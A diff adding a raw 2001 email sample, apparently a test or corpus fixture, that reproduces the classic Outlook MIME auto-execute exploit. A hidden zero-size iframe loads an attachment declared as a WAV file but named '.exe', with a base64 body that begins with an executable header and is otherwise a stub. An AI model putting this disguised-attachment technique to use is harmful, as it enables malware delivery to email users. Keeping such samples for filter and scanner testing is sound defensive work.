@@ -1,0 +1,38 @@
+From mdb@go2net.com Tue Sep 18 10:31:34 2001
+Received: from localhost (varna148.pip.digsys.bg [193.68.1.148])
+	by danbo.digsys.bg (8.10.1/8.10.1) with SMTP id fAM7FHk06734
+	for butchc@trwonnor.com; Thu, 22 Nov 2001 09:15:18 +0200 (EET)
+From: POP - interlogvar <interlogvar@mbox.digsys.bg>
+Message-Id: <200111220715.fAM7FHk06734@danbo.digsys.bg>
+To: butchc@trwonnor.com
+Subject:  Funny shit to see ?! 
+Date: Thu,22 Nov 2001 09:16:34 -0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+        boundary="bound"
+	X-Priority: 3
+	X-MSMail-Priority: Normal
+	X-Mailer: Microsoft Outlook Express 5.50.4522.1300
+	X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1300
+
+This is a multi-part message in MIME format.
+
+--bound
+Content-Type: text/html;
+        charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD></HEAD><BODY><iframe src=3Dcid:SOMECID height=3D0 width=3D0></iframe>
+<font>peace</font></BODY></HTML>
+
+--bound
+Content-Type: audio/x-wav;
+        name="whatever.exe"
+Content-Transfer-Encoding: base64
+Content-ID: <SOMECID>
+
+TVoAAAIAAAACAB4AHgAAAAACAAAAAAAAAAAAAMWnLuEOH7oOALQJ
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA=
+
+--bound--
